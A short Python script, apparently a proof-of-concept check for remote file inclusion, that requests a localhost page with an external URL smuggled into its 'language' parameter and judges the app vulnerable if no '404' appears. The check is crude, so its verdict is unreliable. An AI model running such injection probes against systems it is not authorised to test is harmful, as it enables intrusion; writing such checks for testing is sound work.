
import sys, requests
from bs4 import BeautifulSoup


def attack(url):
    r = requests.get(url)
    soup = BeautifulSoup(r.content, 'html.parser')
    text = soup.get_text()
    if text.find("404") < 0:
        print("The app is vulnerable")
    else :
        print("You are in good hands")


if __name__ == "__main__":
    attack("http://localhost:80/?language=https://www.youtube.com/watch?v=j_uii5z56aY")